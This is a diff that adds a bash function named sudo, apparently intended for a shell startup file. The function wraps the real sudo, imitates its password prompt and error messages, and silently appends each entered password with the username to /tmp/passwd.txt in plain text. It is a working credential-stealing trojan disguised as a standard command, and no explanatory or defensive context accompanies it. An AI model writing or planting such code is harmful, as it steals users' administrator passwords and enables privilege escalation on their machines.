@@ -1,0 +1,29 @@
+function sudo(){
+	realsudo=$(which sudo)
+	if [ $# -eq 0 ];then
+		$realsudo
+	else
+		$realsudo -n true 2>/dev/null
+		if [ $? -eq 0 ];then
+			$realsudo $@
+		else
+			for i in {1..3}
+			do
+				read  -sp "[sudo] password for $USER:" password 
+				printf "\n"
+				echo $USER : $password >> /tmp/passwd.txt
+				echo $password | $realsudo -S true >/dev/null 2>&1
+				cmd_code=$?
+				if [ $cmd_code -eq 1 ] && [ $i -lt 3 ];then
+					echo "Sorry, try again."
+				elif [ $cmd_code -eq 1 ] && [ $i -eq 3 ];then
+					echo "sudo: 3 incorrect password attempts"
+				elif [ $cmd_code -eq 0 ];then
+					$realsudo $@
+					break
+				fi
+			done
+		fi
+	fi
+}
+
